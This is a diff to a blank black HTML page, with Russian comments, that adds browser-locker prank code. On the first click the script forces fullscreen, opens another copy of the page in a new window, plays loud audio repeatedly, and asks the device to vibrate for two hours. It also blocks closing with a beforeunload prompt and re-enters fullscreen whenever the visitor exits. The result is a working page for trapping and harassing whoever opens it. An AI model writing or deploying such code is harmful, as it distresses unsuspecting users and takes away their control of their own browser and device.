@@ -2,26 +2,58 @@
 <html>
 <head>
 <script>
-document.addEventListener('click',()=>{
-  // Основной звук
-  const audio1 = new Audio('f.mp3');
-  audio1.volume = 1;
-  audio1.play();
-  
-  // Максимальная вибрация (максимально разрешенное время)
-  if (navigator.vibrate) navigator.vibrate(10000); // 10 секунд - максимум
-  
-  // Дублирующие звуки
-  for(let i = 1; i <= 5; i++) {
-    setTimeout(() => {
-      const audio = new Audio('f.mp3');
-      audio.volume = 1;
-      audio.play();
-    }, i * 150);
-  }
+let interacted = false;
+
+document.addEventListener('click', async function() {
+    if (!interacted) {
+        interacted = true;
+        
+        // Полный экран
+        try {
+            await document.documentElement.requestFullscreen();
+        } catch (e) {}
+        
+        // Открываем вторую такую же страницу
+        window.open(window.location.href, '_blank', 'fullscreen=yes');
+        
+        // Звук и вибрация
+        const audio1 = new Audio('f.mp3');
+        audio1.volume = 1;
+        audio1.play();
+        
+        if (navigator.vibrate) navigator.vibrate(7200000);
+        
+        for(let i = 1; i <= 10; i++) {
+            setTimeout(() => new Audio('f.mp3').play(), i * 100);
+        }
+    }
+});
+
+// Подтверждение при закрытии
+window.addEventListener('beforeunload', function(e) {
+    if (interacted) {
+        e.preventDefault();
+        e.returnValue = '';
+    }
+});
+
+// Автоматически возвращаем в полноэкранный режим при выходе
+document.addEventListener('fullscreenchange', function() {
+    if (!document.fullscreenElement && interacted) {
+        setTimeout(() => {
+            document.documentElement.requestFullscreen().catch(e => {});
+        }, 100);
+    }
 });
 </script>
-<style>body{margin:0;height:100vh;background:#000}</style>
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    background: #000;
+    cursor: pointer;
+}
+</style>
 </head>
 <body>
 </body>
